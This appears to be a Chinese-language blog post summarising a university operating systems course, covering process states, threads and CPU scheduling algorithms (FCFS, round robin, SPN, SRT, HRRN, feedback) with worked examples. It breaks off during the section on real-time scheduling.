    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/cs-courses/C-language-basis/" title="C语言基础">C语言基础</a></li><li><a href="/cs-courses/modular-inverses/" title="乘法逆元">乘法逆元</a></li><li><a href="/cs-courses/cpp-cryptographic-algorithm-basis/" title="信息安全算法基础">信息安全算法基础</a></li><li><a href="/cs-courses/OS/" title="操作系统基础">操作系统基础</a></li><li><a href="/cs-courses/x86-masm/" title="x86汇编基础">x86汇编基础</a></li><li><a href="/cs-courses/information-theory/" title="信息论与编码">信息论与编码</a></li></ol></blockquote><h1>前言</h1><p>这是电子科技大学计算机系的操作系统课程的总结，笔者已经基本理解这篇文章里的内容，但是如果有不准确之处，恳请指出。在操作系统这个成熟很久的领域中，有不少作者图文并茂的介绍了操作系统地基本知识。但是，笔者认为这里地总结相对精简，直接抵达核心概念，也是阅读学习的好资料。本文很多的总结和图片都来自老师的 PPT，笔者只是学习并且结合其他资料与自己的理解，加以阐释。</p><h1>进程和线程</h1><p>进程是操作系统最核心的概念，简单的说是正在运行的程序的抽象。进程的执行模型可以分成两类，<strong>顺序执行</strong>和<strong>并行执行</strong>，前者效率低，后者硬件要求高。我们整个课程都是只考虑<strong>并发执行</strong>，也就是微观上顺序执行，宏观上并行执行。进程＝进程控制块＋程序＋相关数据，<strong>进程之间各自独立、不可预知速度地并发执行</strong>。</p><h2 id="进程的状态">进程的状态</h2><p>进程有三种基本状态，进程都在内存中：</p><p>**就绪状态：**进程已分配到除 CPU 以外的所有必要资源后，只要再获得 CPU，便可立即执行。</p><p>**执行状态：**进程已获得 CPU，其程序正在执行。</p><p>**阻塞状态：**放弃处理机而处于暂停状态。处理机指计算机系统中存储程序和数据，并按照程序规定的步骤执行指令的部件。</p><img src="http://cdn.blog-blockchain.xyz/202212121700982.png" alt="图片1" style="zoom:50%;" /><p>注意就绪不能直接到阻塞，阻塞也不能直接执行。</p><p>进程还有其他状态：</p><ul><li>New：新建了进程对象，PCB（程序控制块） 在内存，但是程序指令存储在硬盘。</li><li>Exit：进程彻底停止，并且释放内存。</li><li>挂起状态：进程被暂时调离内存。就绪挂起只要程序进入内存就可以运行；阻塞挂起定义模糊，等待事件就会变成就绪挂起。一般时放在交换区，不再竞争 CPU。</li></ul><img src="http://cdn.blog-blockchain.xyz/202212131011289.png" alt="image-20221213101111199" style="zoom: 50%;" /><h2 id="进程的描述">进程的描述</h2><p>单独的进程可以拆解为：</p><ul><li>进程映像：程序、数据、堆、栈的集合。</li><li>程序控制块。用于控制程序的行为，主要包括：<ul><li>进程标识信息。每个进程都分配了唯一的标识符，用于引用进程，表示父进程和子进程的关系。</li><li>处理器状态信息。CPU 寄存器存储栈指针、程序计数器等执行信息，程序状态寄存器存储溢出、进位等程序状态。</li><li>进程控制信息。操作系统控制和协调各种活动进程所需的额外信息。比如优先级、进程运行态、调度算法相关信息、存储管理信息等。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">映像名称                       PID 会话名              会话#       内存使用</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0          8 K</span><br><span class="line">System                           4 Services                   0      1,060 K</span><br><span class="line">Secure System                  168 Services                   0     75,552 K</span><br><span class="line">Registry                       248 Services                   0    227,004 K</span><br><span class="line">smss.exe                       708 Services                   0      1,332 K</span><br><span class="line">csrss.exe                      864 Services                   0      5,612 K</span><br><span class="line">wininit.exe                   1168 Services                   0      6,716 K</span><br><span class="line">csrss.exe                     1176 Console                    1     12,260 K</span><br><span class="line">services.exe                  1240 Services                   0     17,772 K</span><br><span class="line">LsaIso.exe                    1248 Services                   0      3,756 K</span><br></pre></td></tr></table></figure><h2 id="模式切换和进程切换">模式切换和进程切换</h2><p>内核包含了重要的系统功能，常驻内存，管理资源和支撑系统。例如内核管理着进程的创建、终止、调度、同步、通信等，并且管理着存储空间中进程地址分配、内存交换、段页管理等功能。中断处理也是通过内核完成的。</p><p>在程序状态寄存器中存在指示执行模式的位。</p><ol><li>内核模式。它由操作系统直接控制，具有更多的优先权和特权。部分底层的 IO 指令、寄存器操作指令、内存管理指令只能通过特权模式由内核发出。部分内存也只能通过特权模式由内核访问。</li><li>用户模式。它具备较少的优先权，用户在该模式下运行指令。</li></ol><p><strong>进程创建时</strong>，操作系统分配内存和用于管理进程的数据结构，然后对进程进行初始化，将新进程插入对应队列。</p><p>进程切换由<strong>系统中断</strong>和<strong>系统调用</strong>完成。系统中断又分为普通中断和陷阱。<strong>进程切换</strong>的详细步骤：</p><ol><li>保存当前处理器的上下文环境，比如寄存器信息。</li><li>更新进程控制块的信息，将进程控制块移动到相应的队列。</li><li>选择另外一个进程，更新它的进程控制块信息。</li><li>更新内存管理数据结构。</li><li>执行结束后，恢复之前的上下文环境，载入之前寄存器的值。</li></ol><img src="http://cdn.blog-blockchain.xyz/202212131523752.png" alt="图片1" style="zoom: 50%;" /><p><strong>模式切换的过程</strong>：当发生系统中断时，程序计数器置为中断处理程序开始地址，然后从用户模式切换成内核模式，以便执行特权指令。注意模式切换的过程可以不改变进程的状态。</p><h2 id="线程">线程</h2><p><strong>进程是拥有资源的最小单位</strong>，也是调度和执行的基本单位。线程是单个进程内更加细粒度的并发执行的单位，是<strong>调度的最小单位</strong>。线程的创建时间更短、终止花费的时间更短、线程切换时间比进程切换时间更短，因此线程更加轻量级，提高了不同程序间通信的效率。<strong>调度和分派是在线程的基础上完成的</strong>。</p><p>一个进程可能有多个线程，每个线程包括</p><ol><li>执行状态（运行、就绪等）</li><li>未运行时保存的线程上下文</li><li>执行栈</li><li>用于局部变量的静态存储空间</li><li>与进程内其他线程共享的内存和资源访问</li></ol><p><img src="http://cdn.blog-blockchain.xyz/202212291244894.png" alt="image-20221229124455762"></p><p>**一个进程中的所有线程共享一个地址空间和进程所拥有的资源。一个线程对共享资源的修改都将影响同一进程的其他线程的环境。**线程也包括了和进程类似的状态和基本操纵：派生、阻塞、解除阻塞、结束。</p><p>线程可以分为</p><ul><li>用户级线程。线程的管理工作都由应用程序完成，内核意识不到线程的存在。因此，用户线程由应用程序决定，可以运行在任何操作系统上。但是当用户级线程请求系统调用时，<strong>会阻塞当前进程中所有的用户级线程</strong>。<strong>不能利用多处理器技术</strong>。</li><li>内核级线程。线程的管理工作由内核完成，允许同一进程内的多个线程被多处理器处理，<strong>一个线程阻塞时，内核可以调度其他线程</strong>。但是，内核级线程切换时，需要切换到内核模式，会有额外开销。</li></ul><h2 id="进程调度">进程调度</h2><p>当多个进程或者线程竞争 CPU 时，需要选择下一个要运行的进程或者线程，OS 中有完成这个工作的调度程序（scheduler）。</p><p>调度根据距离执行的远近，分为</p><ul><li>长程调度。决定哪个程序可以进入系统中处理，创建进程</li><li>中程调度。内存的交换部分，主要是考虑并发度的限制和存储的限制。</li><li>短程调度。最为频繁的调度程序，直接决定下次执行哪个进程。</li></ul><p>具体如下图所示</p><p><img src="http://cdn.blog-blockchain.xyz/202301062241445.png" alt="image-20230106224153374"></p><p>下面是一些会用到的概念：</p><ul><li>响应时间。从用户提交一个请求开始，到接收响应之间的时间间隔。由输入传送时间、处理时间、响应传送时间构成。</li><li>截止时间。某任务必须开始执行的最迟时间，或必须完成的最迟时间。</li><li>系统吞吐量。在单位时间内，系统所完成的进程数。</li><li>处理器利用率。处理器处于忙状态的时间百分比。</li><li>周转时间。一个进程从提交到完成之间的时间间隔，等于等待资源的时间+执行时间。</li><li>平均周转时间。多个进程周转时间的平均值。</li><li>带权周转时间：进程的周转时间与系统为它提供的服务时间之比。服务时间是系统预计完成需要的时间。</li><li>平均带权周转时间：多个进程带权周转时间的平均值。</li></ul><p>短期调度会直接影响系统性能，需要达到的目标是：用户感知的交互响应时间尽可能短、用户程序完成时间尽可能短、处理器利用效率尽可能高。具体如下图</p><p><img src="http://cdn.blog-blockchain.xyz/202301062335665.png" alt="image-20230106233503614"></p><h2 id="调度算法">调度算法</h2><p>调度可以采用强制优先级，但是可能造成某些进程饥饿，也就是长时间得不到执行机会，因此可以采用动态优先级的方案。动态优先级调度算法分为<strong>抢占和非抢占</strong>，主要区别在于抢占式能中断正在执行的进程，然后执行新的进程。非抢占式需要等待当前进程执行完或者请求服务时被阻塞，新的进程才能执行。</p><p>在决定哪个就绪进程执行时， 有三个关键参数。</p><ul><li>w = 目前为止在系统里的等待时间</li><li>e = 目前为止花费的执行时间</li><li>s = 进程所需的总服务时间，包括 e; 这个参数需要估计或者由用户提供。</li></ul><p>不同的目标就有不同的调度算法，下表是调度算法概览：</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"><strong>FCFS</strong></th><th style="text-align:center"><strong>Round robin</strong></th><th style="text-align:center"><strong>SPN</strong></th><th style="text-align:center"><strong>SRT</strong></th><th style="text-align:center"><strong>HRRN</strong></th><th style="text-align:center"><strong>Feedbadk</strong></th></tr></thead><tbody><tr><td style="text-align:center">选择函数</td><td style="text-align:center">max[w]</td><td style="text-align:center">常数</td><td style="text-align:center">min[s]</td><td style="text-align:center">min[s-e]</td><td style="text-align:center">max[(w+s)/s]</td><td style="text-align:center">参后描述</td></tr><tr><td style="text-align:center">决策模式</td><td style="text-align:center">非抢占</td><td style="text-align:center">抢占(时间片完)</td><td style="text-align:center">非抢占</td><td style="text-align:center">抢占（到达时）</td><td style="text-align:center">非抢占</td><td style="text-align:center">抢占(时间片完)</td></tr><tr><td style="text-align:center">吞吐量</td><td style="text-align:center">不强调</td><td style="text-align:center">时间片小时，吞吐量低</td><td style="text-align:center">高</td><td style="text-align:center">高</td><td style="text-align:center">高</td><td style="text-align:center">不强调</td></tr><tr><td style="text-align:center">响应时间</td><td style="text-align:center">可能很高，尤其在进程执行时间差别大时</td><td style="text-align:center">为短进程提供较好的响应时间</td><td style="text-align:center">为短进程提供较好的响应时间</td><td style="text-align:center">提供较好的响应时间</td><td style="text-align:center">提供较好的响应时间</td><td style="text-align:center">不强调</td></tr><tr><td style="text-align:center">开销</td><td style="text-align:center">最小</td><td style="text-align:center">最小</td><td style="text-align:center">可能较大</td><td style="text-align:center">可能较大</td><td style="text-align:center">可能较大</td><td style="text-align:center">可能较大</td></tr><tr><td style="text-align:center">对进程影响</td><td style="text-align:center">对短进程不利；对 I/O 密集型进程不利</td><td style="text-align:center">公平对待</td><td style="text-align:center">对长进程不利</td><td style="text-align:center">对长进程不利</td><td style="text-align:center">平衡性好</td><td style="text-align:center">对 I/O 密集型进程可能有利</td></tr><tr><td style="text-align:center">饥饿</td><td style="text-align:center">无</td><td style="text-align:center">无</td><td style="text-align:center">可能</td><td style="text-align:center">可能</td><td style="text-align:center">无</td><td style="text-align:center">可能</td></tr></tbody></table><h3 id="先来先服务-FCFS">先来先服务 FCFS</h3><p>选择就绪队列中存在时间最长的进程运行，即按<strong>请求 CPU 的顺序使用 CPU</strong>。对于下面的调度，结果如下图。</p><table><thead><tr><th><strong>进程名</strong></th><th><strong>产生时间</strong></th><th><strong>服务时间</strong></th></tr></thead><tbody><tr><td><strong>A</strong></td><td>0</td><td>3</td></tr><tr><td><strong>B</strong></td><td>2</td><td>6</td></tr><tr><td><strong>C</strong></td><td>4</td><td>4</td></tr><tr><td><strong>D</strong></td><td>6</td><td>5</td></tr><tr><td><strong>E</strong></td><td>8</td><td>2</td></tr></tbody></table><img src="http://cdn.blog-blockchain.xyz/202301062359685.png" alt="image-20230106235907630" style="zoom:50%;" /><p>平均周转时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>3</mn><mo>+</mo><mn>7</mn><mo>+</mo><mn>9</mn><mo>+</mo><mn>12</mn><mo>+</mo><mn>12</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>5</mn><mo>=</mo><mn>8.6</mn></mrow><annotation encoding="application/x-tex">(3+7+9+12+12)/5=8.6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">12</span><span class="mclose">)</span><span class="mord">/5</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8.6</span></span></span></span>，平均带权周转时间</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mfrac><mn>3</mn><mn>3</mn></mfrac><mo>+</mo><mfrac><mn>7</mn><mn>6</mn></mfrac><mo>+</mo><mfrac><mn>9</mn><mn>4</mn></mfrac><mo>+</mo><mfrac><mn>12</mn><mn>5</mn></mfrac><mo>+</mo><mfrac><mn>12</mn><mn>2</mn></mfrac></mrow><mn>5</mn></mfrac><mo>=</mo><mn>2.56</mn></mrow><annotation encoding="application/x-tex">\frac{\frac{3}{3}+\frac{7}{6}+\frac{9}{4}+\frac{12}{5}+\frac{12}{2}}{5}=2.56</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.2661em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5801em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.735em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2.56</span></span></span></span></span></p><p>FCFS 是非抢占调度算法，<strong>有利于 CPU 繁忙型的进程，而不利于 I/O 繁忙型的进程</strong>，平均周转时间长，不利于短进程，因为等待时间较长。</p><h3 id="时间片轮转调度算法-RR">时间片轮转调度算法 RR</h3><p>每个进程被分配一个时间片，周期性产生时钟中断，中断时当前进程进入就绪队列末尾，基于 FCFS 选择下一个作业运行。<strong>如果进程在时间片内阻塞或结束，则 CPU 立即执行调度</strong>。</p><p>这是抢占式算法，时间片用完之后一定会被中断。</p><table><thead><tr><th style="text-align:center"><strong>进程名</strong></th><th style="text-align:center"><strong>产生时间</strong></th><th style="text-align:center"><strong>服务时间</strong></th><th style="text-align:center"><strong>时间片</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>A</strong></td><td style="text-align:center">0</td><td style="text-align:center">3</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><strong>B</strong></td><td style="text-align:center">2</td><td style="text-align:center">6</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><strong>C</strong></td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><strong>D</strong></td><td style="text-align:center">6</td><td style="text-align:center">5</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><strong>E</strong></td><td style="text-align:center">8</td><td style="text-align:center">2</td><td style="text-align:center">1</td></tr></tbody></table><img src="http://cdn.blog-blockchain.xyz/202301262100605.png" style="zoom:50%;" /><p>**先添加新进程到队尾，再把过了时间片的进程放在最后。**具体过程如下，需要每个时刻：</p><ol><li>A2。这里标记的方法是，进程名字后的数字表示还剩下的服务时间。</li><li>B6A1</li><li>A1B5</li><li>B5C4</li><li>C4B4</li><li>B4D6C3</li></ol><p>过程以此类推。RR 算法属于抢占性算法，常用于分时系统。时间片的长短会显著地影响系统的性能，太短则进程切换太频繁，太长则短进程会产生时间浪费。另外，由于 IO 会阻塞进程，所以<strong>对 IO 密集类型的进程不利，对 CPU 密集的类型有利</strong>。在 RR 算法的基础上，提出了改进后的 VRR 算法，用于改善 IO 密集类型进程的不利地位。</p><h3 id="短进程优先-SJF-SPF-SPN">短进程优先 SJF/SPF/SPN</h3><p>短进程优先算法是<strong>非抢占式</strong>的算法，每当当前进程结束，就会根据当前每个进程的服务时间选择执行哪一个进程。</p><table><thead><tr><th><strong>进程名</strong></th><th><strong>产生时间</strong></th><th><strong>服务时间</strong></th></tr></thead><tbody><tr><td><strong>A</strong></td><td>0</td><td>3</td></tr><tr><td><strong>B</strong></td><td>2</td><td>6</td></tr><tr><td><strong>C</strong></td><td>4</td><td>4</td></tr><tr><td><strong>D</strong></td><td>6</td><td>5</td></tr><tr><td><strong>E</strong></td><td>8</td><td>2</td></tr></tbody></table><img src="http://cdn.blog-blockchain.xyz/202301262107906.png" alt="image-20230126210727844" style="zoom:50%;" /><p>核心点在于进程结束之后，选择服务时间最短的进程执行。由于短进程优先，所以服务时间长的进程容易饥饿，同时也减少了平均周转时间。服务时间是用户估计的时间，但是不一定等于实际需要占用处理机的时间。由于没有抢占机制，可能不适合某些场景。</p><p>平均周转时间 <code>(3+7+11+14+2)/5=7.4</code>，平均带权周转时间 <code>(3/3+7/6+11/4+14/5+2/2)/5=1.74</code></p><h3 id="剩余时间最短优先-SRT">剩余时间最短优先 SRT</h3><p>剩余时间最短优先算法是<strong>抢占式</strong>的算法，每当当前进程结束<strong>或者新进程到来</strong>，就会根据当前每个进程剩余的服务时间选择执行哪一个进程。数据与之前的相同，得到的结果如下。</p><img src="http://cdn.blog-blockchain.xyz/202301262123148.png" alt="image-20230126212347084" style="zoom:50%;" /><ul><li>时刻 2 时，A 剩下 1，B 剩下 6，执行 A</li><li>时刻 3 时，B 剩下 6，执行 B</li><li>时刻 4 时，B 剩下 5，C 剩下 4，所以抢占，执行 C。</li><li>时刻 6 时，B 剩下 5，C 剩下 2，D 剩下 5.</li><li>时刻 8 时，B 剩下 5，D 剩下 5，E 剩下 2，所以执行 E。</li><li>时刻 10 时，<strong>因为 B 和 D 剩下时间相同，按照入队顺序，执行 B</strong></li><li>时刻 15 时，执行 D。</li></ul><p>平均周转时间 <code>(3+13+4+14+2)/5=7.2</code>，平均带权周转时间 <code>(3/3+13/6+4/4+14/5+2/2)/5=1.59</code>。周转时间方面，SRT 比 SJF 性能要好，只要就绪，短作业可以立即被选择执行。但是仍然存在长进程饥饿等问题。</p><h3 id="高响应比优先-HRRN">高响应比优先 HRRN</h3><p>当前进程执行完毕或需要阻塞时，选择就绪队列中响应比最高的进程投入执行。他是<strong>非抢占性</strong>调度算法。响应比的计算 <code>(等待时间+要求服务时间)/要求服务时间</code>。</p><table><thead><tr><th><strong>进程名</strong></th><th><strong>产生时间</strong></th><th><strong>服务时间</strong></th></tr></thead><tbody><tr><td><strong>A</strong></td><td>0</td><td>3</td></tr><tr><td><strong>B</strong></td><td>2</td><td>6</td></tr><tr><td><strong>C</strong></td><td>4</td><td>4</td></tr><tr><td><strong>D</strong></td><td>6</td><td>5</td></tr><tr><td><strong>E</strong></td><td>8</td><td>2</td></tr></tbody></table><img src="http://cdn.blog-blockchain.xyz/202301262308365.png" alt="image-20230126230822298" style="zoom: 50%;" /><ul><li>时刻 3，A 执行结束，只剩下 B。所以执行 B。</li><li>时刻 9，B 执行结束，C 响应比(5+4)/4=2.25，D 响应比(3+5)/5=1.6，所以执行 C。</li><li>时刻 13，C 执行完，D 响应比(7+5)/5=2.4，E 响应比(5+2)/2，所以执行 E。</li></ul><p>HRRN 算法其实是动态权重算法，既考虑了短进程不应该等待过长的时间，又考虑了长进程不至于饥饿。但是计算响应比会增加开销。</p><h3 id="反馈调度-FB">反馈调度 FB</h3><p>采用了「惩罚运行时间较久的进程」 的思想，算法有很多种，大致的思路是维护多个就绪队列，每个队列的优先级不同，进程根据一定的规则动态调整优先级。注意是<strong>抢占式</strong>调度算法。</p><p>下面介绍一种基于时间片轮转的反馈调度算法，具体规则如下：</p><ol><li><p>设置多个就绪队列，每个队列赋予不同优先级。</p><ol><li>第一队列优先级最高，依次递减；</li><li>各个队列中进程执行的时间片不相同，优先级越高的队列，时间片越小。</li></ol></li><li><p>新进程进入时，首先放入第一个队列尾，按 FCFS 原则排队。</p></li><li><p>如果进程在当前队列规定的时间片内完成则退出，一般而言，从队列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 中调度的进程允许执行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">2^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span></span></span> 的时间，然后才被抢占，降级到下一个优先级队列（如果没有被抢占（无其他进程需调度），则当前进程不降级）。</p></li><li><p>到达最低优先级队列后，不再降级。</p></li><li><p>仅当第一队列空闲时，才调度第二队列中的进程，依次类推。</p></li></ol><p>仍然是之前的例子，调度的结果如下，<strong>队列编号从 0 开始</strong>。</p><p><img src="http://cdn.blog-blockchain.xyz/202301271656699.png" alt="image-20230127165612521"></p><ul><li>时刻 0，A 进入队列 0，允许执行的时间是 1。</li><li>时刻 1，因为没有其他进程，A 不降级，进入队列 0，允许执行时间 1。执行 A。</li><li>时刻 2，A 时间片用完，被抢占，队列 0 是 B，队列 1 是 A，所以 B 执行一个单位。</li><li>时刻 3，B 时间片用完，队列 1 是 AB，所以执行 A。</li><li>时刻 4，A 执行完退出，队列 0 是 C，队列 1 是 B，所以执行 C。</li><li>时刻 5，C 执行完，队列 1 是 BC，所以执行 B。</li><li>时刻 6，由于 B 允许执行 2 个单位才被抢占，所以继续执行。</li><li>时刻 7，队列 0 是 D，队列 1 是 C，队列 2 是 B。</li><li>以此类推</li></ul><p>多级反馈队列调度算法性能较好，短进程可以在前面几个队列执行完，长进程允许执行的时间也能快速增长。但是如果一直提交短进程，长进程仍然可能饥饿。</p><h2 id="实时系统的调度">实时系统的调度</h2><p>实时系统能够<strong>即时</strong>响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务<strong>协调一致</strong>地运行。规定的时间分为</p><ul><li>开始截止时间：必须在某个时间之前执行任务。</li><li>完成截至时间：必须在某个时间之前完成任务。</li></ul><h3 id="实时任务">实时任务</h3><p>实时任务一般有如下信息：</p><ul><li>就绪时间</li><li>启动的限期（starting deadline）</li><li>完成的限期（completion deadline）</li><li>处理的时间：任务执行到完成的时间</li><li>资源需求：任务执行过程中所需的资源集</li><li>优先级：度量任务的相对重要性</li><li>子任务结构：一个任务可分解为一个必须执行的子任务和一个可选执行子任务，前者有硬截止时间（hard deadline）</li></ul><p>可以知道，越早执行就越容易满足期限。非抢占方式可以更好的安排任务，满足启动的期限。抢占的方式可以更好的满足完成的期限。</p><h3 id="调度算法的组成">调度算法的组成</h3><p>我们之前讨论的调度算法，都是实时系统的调度算法。实时系统的调度则是由调度方法和抢占的方式决定的。这一小节会从理论上概括调度算法。</p><p>调度方法可以分成如下几类：</p><ol><li><strong>静态表驱动</strong>：他用于调度<strong>周期性实时任务</strong>，根据任务周期到达的时间、执行时间、完成截止时间（ending deadline）以及任务的优先级，<strong>制订调度表</strong>。这种算法不灵活，静态的调度表要经常修改。</li><li><strong>静态优先级抢占调度法</strong>：多用于非实时多道程序系统，根据系统时间的约束赋予优先级。多道程序系统是在<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E5%AD%98/9021807?fromModule=lemma_inlink">计算机内存</a>中同时存放几道相互独立的程序，使它们在管理<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6?fromModule=lemma_inlink">程序控制</a>之下，相互穿插的运行。也就是一般意义上的单 